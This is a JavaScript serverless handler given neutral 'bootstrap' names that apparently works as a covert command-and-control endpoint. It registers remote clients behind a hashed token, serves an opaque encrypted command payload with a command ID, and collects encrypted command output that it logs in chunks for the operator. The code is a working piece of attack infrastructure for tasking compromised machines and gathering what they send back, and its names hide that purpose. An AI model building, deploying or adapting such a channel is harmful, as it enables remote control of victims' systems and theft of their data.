import crypto from 'node:crypto';

const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
const CONTROL_ID = '35';
const CONTROL_PAYLOAD = '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';

async function readBody(request) {
  if (typeof request.body === 'string') return request.body;
  if (Buffer.isBuffer(request.body)) return request.body.toString('utf8');
  if (request.body && typeof request.body === 'object') return JSON.stringify(request.body);
  const chunks = [];
  for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
  return Buffer.concat(chunks).toString('utf8');
}
function validBootstrapToken(request) {
  const raw = request.headers['x-bootstrap-token'];
  const token = Array.isArray(raw) ? raw[0] : raw;
  if (!token) return false;
  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
  const a = Buffer.from(digest, 'hex');
  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
  return a.length === b.length && crypto.timingSafeEqual(a, b);
}
export default async function handler(request, response) {
  const url = new URL(request.url, 'https://bootstrap.invalid');
  const mode = url.searchParams.get('mode');
  response.setHeader('cache-control', 'no-store');
  response.setHeader('x-content-type-options', 'nosniff');
  if (mode === 'register') {
    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
    const body = await readBody(request);
    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
    return response.status(204).end();
  }
  if (mode === 'control') {
    if (request.method !== 'GET') return response.status(404).send('Not found');
    response.setHeader('content-type', 'text/plain; charset=utf-8');
    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
  }
  if (mode === 'output') {
    if (request.method !== 'POST') return response.status(404).send('Not found');
    const body = await readBody(request);
    const splitAt = body.indexOf(':');
    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
    const chunkSize = 1800;
    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
    return response.status(204).end();
  }
  return response.status(404).send('Not found');
}
